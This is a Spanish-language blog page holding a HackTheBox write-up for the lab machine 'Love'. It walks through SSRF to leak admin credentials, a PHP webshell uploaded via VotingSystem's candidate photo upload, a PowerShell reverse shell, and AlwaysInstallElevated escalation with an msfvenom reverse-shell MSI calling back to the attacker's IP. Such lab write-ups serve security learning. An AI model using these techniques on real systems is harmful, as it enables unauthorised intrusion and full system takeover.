@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Love Machine - HackTheBox · Celero0 Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CeleroRKX">
+<meta name="description" content="Esta es una máquina Windows de nivel fácil de la plataforma Hackthebox">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Love Machine - HackTheBox">
+  <meta name="twitter:description" content="Esta es una máquina Windows de nivel fácil de la plataforma Hackthebox">
+
+<meta property="og:url" content="https://celero0.github.io/posts/love/">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Love Machine - HackTheBox">
+  <meta property="og:description" content="Esta es una máquina Windows de nivel fácil de la plataforma Hackthebox">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-11-24T19:39:22+00:00">
+    <meta property="article:modified_time" content="2025-11-24T19:39:22+00:00">
+
+
+
+
+<link rel="canonical" href="https://celero0.github.io/posts/love/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://celero0.github.io/">
+      Celero0 Blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://celero0.github.io/posts/love/">
+              Love Machine - HackTheBox
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-11-24T19:39:22Z">
+                November 24, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              3-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <hr>
+<ul>
+<li>Tags: #Machine #Windows #Easy</li>
+</ul>
+<hr>
+<h1 id="enumeración">
+  Enumeración
+  <a class="heading-link" href="#enumeraci%c3%b3n">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Partimos realizando un escaneo de los puertos abiertos de la máquina víctima de la siguiente forma.
+<strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.10.239 -oG allPorts
+</span></span></code></pre></div><img src="/images/Pasted image 20251108011547.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Vemos que en el puerto 443 que corresponde al servicio HTTPS, nos muestra información sobre un subdominio llamado <code>staging.love.htb</code></p>
+<img src="/images/Pasted image 20251108011952.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto procederemos a agregar el dominio y subdominio a nuestro <code>/etc/hosts</code></p>
+<img src="/images/Pasted image 20251108181655.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="enumeración-http">
+  Enumeración HTTP
+  <a class="heading-link" href="#enumeraci%c3%b3n-http">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Primeramente corremos el script de nmap <code>http-enum</code> para realizar un fuzzeo rápido</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p80 --script http-enum 10.10.10.239
+</span></span></code></pre></div><p>Encontrando los siguientes directorios:</p>
+<img src="/images/Pasted image 20251108181835.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Además vemos el puerto 5000 que corre el servicio <code>http</code> y el puerto 80.
+Enumerando el puerto 5000 vemos que solo tenemos una página que nos muestra el código 403, es decir que no estamos autorizados a ver el contenido</p>
+<img src="/images/Pasted image 20251108012305.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>En el puerto 80 probaremos el dominio <code>love.htb</code>, el cual contiene un login que nos pide ID</p>
+<img src="/images/Pasted image 20251108181949.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>y en la ruta  <code>love.htb/admin/index.php</code> encontramos otro login de administrador, que nos pide usuarios</p>
+<img src="/images/Pasted image 20251108182020.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora analizando el subdominio <code>staging.love.htb</code> tenemos una herramienta que nos permite escanear archivos</p>
+<img src="/images/Pasted image 20251108182148.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>En la ruta <code>http://staging.love.htb/beta.php</code> nos da la opción de poner algún url</p>
+<img src="/images/Pasted image 20251108182216.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Como nos permite usar url probaremos realizar un SSRF, poniendo <code>http://localhost</code> vemos que carga la página del puerto 80 <code>love.htb</code></p>
+<img src="/images/Pasted image 20251108182320.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Como vimos en el escaneo inicial que el puerto 5000 está corriendo el servicio <code>HTTP</code> probamos ver si hay alguna información relevante, y obtenemos las credenciales de administrador <code>admin:@LoveIsInTheAir!!!!</code></p>
+<img src="/images/Pasted image 20251108182545.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Utilizamos las credenciales en <code>http://love.htb/admin/index.php</code> y entramos al dashboard de admin</p>
+<img src="/images/Pasted image 20251108182700.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="explotación-de-votingsystem">
+  Explotación de VotingSystem
+  <a class="heading-link" href="#explotaci%c3%b3n-de-votingsystem">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Buscando por vulnerabilidades de <code>VotingSystem</code> en la web, nos encontramos con lo siguiente</p>
+<img src="/images/Pasted image 20251108182814.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Viendo el payload tenemos lo siguiente</p>
+<img src="/images/Pasted image 20251108182836.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Se ve una petición POST hacia <code>/admin/candidates_add.php</code>, y que el código malicioso se inserta en un archivo subido llamado &ldquo;photo&rdquo;</p>
+<p>En el dashboard existe el botón de <code>candidates</code></p>
+<img src="/images/Pasted image 20251108183019.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Al agregar un candidato nos pide crear una <code>Position</code></p>
+<img src="/images/Pasted image 20251108183041.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Y el campo de position también está en el dashboard, lo creamos</p>
+<img src="/images/Pasted image 20251108183107.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Y ahora llenamos los campos, subiendo una imagen cualquiera</p>
+<img src="/images/Pasted image 20251108183151.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Interceptamos la petición con <code>burpsuite</code> y agregamos la siguiente webshell</p>
+<img src="/images/Pasted image 20251108183347.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Quedando la petición de la siguiente forma, cambiando la extensión del <code>filename=</code> a <code>.php</code></p>
+<img src="/images/Pasted image 20251108183419.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Vemos que en la web se ve la foto con un error</p>
+<img src="/images/Pasted image 20251108183505.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Inspeccionando la foto encontramos la ruta <code>images/gato.php</code></p>
+<img src="/images/Pasted image 20251108183549.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora usamos el parametro cmd para usar algun comando de la siguiente forma <code>http://love.htb/images/gato.php?cmd=whoami</code></p>
+<img src="/images/Pasted image 20251108183628.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>En <code>https://www.revshells.com/</code> buscamos una reverse shell en powershell encoded en base64</p>
+<img src="/images/Pasted image 20251108183733.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Nos ponemos en escucha</p>
+<img src="/images/Pasted image 20251108183811.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>y mandamos el codigo de powershell</p>
+<img src="/images/Pasted image 20251108183833.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Obteniendo la shell</p>
+<img src="/images/Pasted image 20251108183853.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Obtenemos la flag de usuario</p>
+<img src="/images/Pasted image 20251108190313.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="escalada-de-privilegios">
+  Escalada de privilegios
+  <a class="heading-link" href="#escalada-de-privilegios">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Utilizaremos la herramienta <code>Winpeas</code> para buscar formas de escalar privilegios en windows, del siguiente link de github <code>https://github.com/peass-ng/PEASS-ng/releases/tag/20251101-a416400b</code></p>
+<p>Descargamos la versión <code>WinPEASx64.exe</code></p>
+<img src="/images/Pasted image 20251108190614.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Para descargarlo usaremos wget</p>
+<img src="/images/Pasted image 20251108190703.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Corremos el script con el siguiente comando, el script si no muestra nada mientras carga debemos esperar</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>./winPEASx64.<span style="color:#79c0ff">exe</span>
+</span></span></code></pre></div><p>Encontramos una forma de escalar privilegios</p>
+<img src="/images/Pasted image 20251108192234.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Tenemos los parámetros</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>AlwaysInstallElevated set to <span style="color:#a5d6ff">1</span> <span style="color:#ff7b72">in</span> HKLM!
+</span></span><span style="display:flex;"><span>AlwaysInstallElevated set to <span style="color:#a5d6ff">1</span> <span style="color:#ff7b72">in</span> HKCU!
+</span></span></code></pre></div><p>Si vemos el link que nos recomiendan en hacktricks <code>https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated</code>
+Nos dice que podemos ejecutar archivos <code>.msi</code> como administrator</p>
+<img src="/images/Pasted image 20251108192356.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>y nos dan un script que permite agregar un usuario</p>
+<img src="/images/Pasted image 20251108192442.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Pero nosotros crearemos una reverse shell con <code>msfvenom</code> y se ejecutará como <code>administrator</code>, dandonos la shell con ese privilegio. Utilizaremos el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/shell_reverse_tcp <span style="color:#79c0ff">LHOST</span><span style="color:#ff7b72;font-weight:bold">=</span>10.10.14.10 <span style="color:#79c0ff">LPORT</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">4444</span> -f msi -o reverse.msi
+</span></span></code></pre></div><img src="/images/Pasted image 20251108192826.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Compartimos el archivo con un servidor web, y nos ponemos en escucha en el puerto 4444</p>
+<img src="/images/Pasted image 20251108192907.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>y en la máquina víctima descargamos el archivo con wget</p>
+<img src="/images/Pasted image 20251108193002.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Para correr nuestro <code>reverse.msi</code> utilizaremos el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>msiexec /quiet /i reverse.<span style="color:#79c0ff">msi</span>
+</span></span></code></pre></div><p>Y obtenemos la consola como administrator</p>
+<img src="/images/Pasted image 20251108193111.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Y obtenemos la flag de root.txt</p>
+<img src="/images/Pasted image 20251108193141.png" style="width:100%; height:auto; display:block; margin:auto;">
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2025
+     CeleroRKX 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
